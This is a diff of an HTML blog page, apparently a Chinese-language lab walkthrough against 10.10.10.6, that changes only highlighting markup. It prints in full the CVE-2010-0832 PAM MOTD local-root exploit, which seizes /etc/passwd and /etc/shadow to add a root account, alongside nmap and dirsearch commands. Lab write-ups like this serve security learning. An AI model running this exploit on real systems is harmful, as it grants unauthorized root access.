@@ -144,8 +144,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nmap -T4 -A -v 10.10.10.6
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap -T4 -A -v 10.10.10.6
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>发现服务器开了 <code>22</code> 端口和 <code>80</code> 端口浏览器访问 <code>http</code> 服务，发现 只有 <code>apache</code> 的默认页面。</p>
 <h3 id="目录扫描">目录扫描</h3>
@@ -155,8 +155,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">python3 dirsearch -u http://10.10.10.6 -e html
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 dirsearch -u http://10.10.10.6 -e html
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>发现 <code>test.php</code> 页面和 <code>torrent</code> 目录，针对 <code>torrent</code> 目录进行目录扫描，发现 <code>upload</code> 上传目录可以访问，同时存在 index.php 页面。</p>
 <h3 id="功能点搜索">功能点搜索</h3>
@@ -315,70 +315,70 @@
 </span><span class="lnt">63
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
-</span><span class="cp"></span><span class="c1">#</span>
-<span class="c1"># Exploit Title: Ubuntu PAM MOTD local root</span>
-<span class="c1"># Date: July 9, 2010</span>
-<span class="c1"># Author: Anonymous</span>
-<span class="c1"># Software Link: http://packages.ubuntu.com/</span>
-<span class="c1"># Version: pam-1.1.0</span>
-<span class="c1"># Tested on: Ubuntu 9.10 (Karmic Koala), Ubuntu 10.04 LTS (Lucid Lynx)</span>
-<span class="c1"># CVE: CVE-2010-0832</span>
-<span class="c1"># Patch Instructions: sudo aptitude -y update; sudo aptitude -y install libpam~n~i</span>
-<span class="c1"># References: http://www.exploit-db.com/exploits/14273/ by Kristian Erik Hermansen</span>
-<span class="nv">P</span><span class="o">=</span><span class="s1">&#39;toor❌0:0:root:/root:/bin/bash&#39;</span>
-<span class="nv">S</span><span class="o">=</span><span class="s1">&#39;toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::&#39;</span>
-<span class="nb">echo</span> <span class="s2">&#34;[*] Ubuntu PAM MOTD local root&#34;</span>
-<span class="o">[</span> -z <span class="s2">&#34;</span><span class="k">$(</span>which ssh<span class="k">)</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;[-] ssh is a requirement&#34;</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">1</span>
-<span class="o">[</span> -z <span class="s2">&#34;</span><span class="k">$(</span>which ssh-keygen<span class="k">)</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;[-] ssh-keygen is a requirement&#34;</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">1</span>
-<span class="o">[</span> -z <span class="s2">&#34;</span><span class="k">$(</span>ps -u root <span class="p">|</span>grep sshd<span class="k">)</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;[-] a running sshd is a requirement&#34;</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">1</span>
-backup<span class="o">()</span> <span class="o">{</span>
-    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>.bak <span class="o">]</span> <span class="o">&amp;&amp;</span> rm -rf <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>.bak
-    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="k">return</span> <span class="m">0</span>
-    mv <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span><span class="o">{</span>,.bak<span class="o">}</span> <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
-    <span class="nb">echo</span> <span class="s2">&#34;[*] Backuped </span><span class="nv">$1</span><span class="s2">&#34;</span>
-<span class="o">}</span>
-restore<span class="o">()</span> <span class="o">{</span>
-    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> rm -rf <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
-    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>.bak <span class="o">]</span> <span class="o">||</span> <span class="k">return</span> <span class="m">0</span>
-    mv <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span><span class="o">{</span>.bak,<span class="o">}</span> <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
-    <span class="nb">echo</span> <span class="s2">&#34;[*] Restored </span><span class="nv">$1</span><span class="s2">&#34;</span>
-<span class="o">}</span>
-key_create<span class="o">()</span> <span class="o">{</span>
-    backup ~/.ssh/authorized_keys
-    ssh-keygen -q -t rsa -N <span class="s1">&#39;&#39;</span> -C <span class="s1">&#39;pam&#39;</span> -f <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">&#34;</span> <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
-    <span class="o">[</span> ! -d ~/.ssh <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">{</span> mkdir ~/.ssh <span class="o">||</span> <span class="k">return</span> 1<span class="p">;</span> <span class="o">}</span>
-    mv <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">.pub&#34;</span> ~/.ssh/authorized_keys <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
-    <span class="nb">echo</span> <span class="s2">&#34;[*] SSH key set up&#34;</span>
-<span class="o">}</span>
-key_remove<span class="o">()</span> <span class="o">{</span>
-    rm -f <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">&#34;</span>
-    restore ~/.ssh/authorized_keys
-    <span class="nb">echo</span> <span class="s2">&#34;[*] SSH key removed&#34;</span>
-<span class="o">}</span>
-own<span class="o">()</span> <span class="o">{</span>
-    <span class="o">[</span> -e ~/.cache <span class="o">]</span> <span class="o">&amp;&amp;</span> rm -rf ~/.cache
-    ln -s <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> ~/.cache <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
-    <span class="nb">echo</span> <span class="s2">&#34;[*] spawn ssh&#34;</span>
-    ssh -o <span class="s1">&#39;NoHostAuthenticationForLocalhost yes&#39;</span> -i <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">&#34;</span> localhost <span class="nb">true</span>
-    <span class="o">[</span> -w <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Own </span><span class="nv">$1</span><span class="s2"> failed&#34;</span><span class="p">;</span> restore ~/.cache<span class="p">;</span> bye<span class="p">;</span> <span class="o">}</span>
-    <span class="nb">echo</span> <span class="s2">&#34;[+] owned: </span><span class="nv">$1</span><span class="s2">&#34;</span>
-<span class="o">}</span>
-bye<span class="o">()</span> <span class="o">{</span>
-    key_remove
-    <span class="nb">exit</span> <span class="m">1</span>
-<span class="o">}</span>
-<span class="nv">KEY</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>mktemp -u<span class="k">)</span><span class="s2">&#34;</span>
-key_create <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Failed to setup SSH key&#34;</span><span class="p">;</span> <span class="nb">exit</span> 1<span class="p">;</span> <span class="o">}</span>
-backup ~/.cache <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Failed to backup ~/.cache&#34;</span><span class="p">;</span> bye<span class="p">;</span> <span class="o">}</span>
-own /etc/passwd <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$P</span><span class="s2">&#34;</span> &gt;&gt; /etc/passwd
-own /etc/shadow <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$S</span><span class="s2">&#34;</span> &gt;&gt; /etc/shadow
-restore ~/.cache <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Failed to restore ~/.cache&#34;</span><span class="p">;</span> bye<span class="p">;</span> <span class="o">}</span>
-key_remove
-<span class="nb">echo</span> <span class="s2">&#34;[+] Success! Use password toor to get root&#34;</span>
-su -c <span class="s2">&#34;sed -i &#39;/toor:/d&#39; /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \
-</span><span class="s2">  chgrp shadow /etc/shadow; nscd -i passwd &gt;/dev/null 2&gt;&amp;1; bash&#34;</span> toor
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Title: Ubuntu PAM MOTD local root</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Date: July 9, 2010</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Author: Anonymous</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Software Link: http://packages.ubuntu.com/</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Version: pam-1.1.0</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Tested on: Ubuntu 9.10 (Karmic Koala), Ubuntu 10.04 LTS (Lucid Lynx)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># CVE: CVE-2010-0832</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Patch Instructions: sudo aptitude -y update; sudo aptitude -y install libpam~n~i</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># References: http://www.exploit-db.com/exploits/14273/ by Kristian Erik Hermansen</span>
+</span></span><span class="line"><span class="cl"><span class="nv">P</span><span class="o">=</span><span class="s1">&#39;toor❌0:0:root:/root:/bin/bash&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">S</span><span class="o">=</span><span class="s1">&#39;toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[*] Ubuntu PAM MOTD local root&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span> -z <span class="s2">&#34;</span><span class="k">$(</span>which ssh<span class="k">)</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;[-] ssh is a requirement&#34;</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span> -z <span class="s2">&#34;</span><span class="k">$(</span>which ssh-keygen<span class="k">)</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;[-] ssh-keygen is a requirement&#34;</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span> -z <span class="s2">&#34;</span><span class="k">$(</span>ps -u root <span class="p">|</span>grep sshd<span class="k">)</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;[-] a running sshd is a requirement&#34;</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl">backup<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>.bak <span class="o">]</span> <span class="o">&amp;&amp;</span> rm -rf <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>.bak
+</span></span><span class="line"><span class="cl">    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="k">return</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    mv <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span><span class="o">{</span>,.bak<span class="o">}</span> <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[*] Backuped </span><span class="nv">$1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">restore<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> rm -rf <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>.bak <span class="o">]</span> <span class="o">||</span> <span class="k">return</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    mv <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span><span class="o">{</span>.bak,<span class="o">}</span> <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[*] Restored </span><span class="nv">$1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">key_create<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    backup ~/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">    ssh-keygen -q -t rsa -N <span class="s1">&#39;&#39;</span> -C <span class="s1">&#39;pam&#39;</span> -f <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">&#34;</span> <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl">    <span class="o">[</span> ! -d ~/.ssh <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">{</span> mkdir ~/.ssh <span class="o">||</span> <span class="k">return</span> 1<span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    mv <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">.pub&#34;</span> ~/.ssh/authorized_keys <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[*] SSH key set up&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">key_remove<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    rm -f <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    restore ~/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[*] SSH key removed&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">own<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">[</span> -e ~/.cache <span class="o">]</span> <span class="o">&amp;&amp;</span> rm -rf ~/.cache
+</span></span><span class="line"><span class="cl">    ln -s <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> ~/.cache <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[*] spawn ssh&#34;</span>
+</span></span><span class="line"><span class="cl">    ssh -o <span class="s1">&#39;NoHostAuthenticationForLocalhost yes&#39;</span> -i <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">&#34;</span> localhost <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">    <span class="o">[</span> -w <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Own </span><span class="nv">$1</span><span class="s2"> failed&#34;</span><span class="p">;</span> restore ~/.cache<span class="p">;</span> bye<span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[+] owned: </span><span class="nv">$1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">bye<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    key_remove
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">KEY</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>mktemp -u<span class="k">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">key_create <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Failed to setup SSH key&#34;</span><span class="p">;</span> <span class="nb">exit</span> 1<span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">backup ~/.cache <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Failed to backup ~/.cache&#34;</span><span class="p">;</span> bye<span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">own /etc/passwd <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$P</span><span class="s2">&#34;</span> &gt;&gt; /etc/passwd
+</span></span><span class="line"><span class="cl">own /etc/shadow <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$S</span><span class="s2">&#34;</span> &gt;&gt; /etc/shadow
+</span></span><span class="line"><span class="cl">restore ~/.cache <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Failed to restore ~/.cache&#34;</span><span class="p">;</span> bye<span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">key_remove
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Success! Use password toor to get root&#34;</span>
+</span></span><span class="line"><span class="cl">su -c <span class="s2">&#34;sed -i &#39;/toor:/d&#39; /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \
+</span></span></span><span class="line"><span class="cl"><span class="s2">  chgrp shadow /etc/shadow; nscd -i passwd &gt;/dev/null 2&gt;&amp;1; bash&#34;</span> toor
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>并给该脚本赋予执行权限：</p>
 <div class="highlight"><div class="chroma">
@@ -386,8 +386,8 @@ su -c <span class="s2">&#34;sed -i &#39;/toor:/d&#39; /etc/{passwd,shadow}; chow
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">chmod + x 1.sh
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod + x 1.sh
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>执行脚本，获得 root 权限：
 <img
@@ -434,7 +434,7 @@ su -c <span class="s2">&#34;sed -i &#39;/toor:/d&#39; /etc/{passwd,shadow}; chow
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
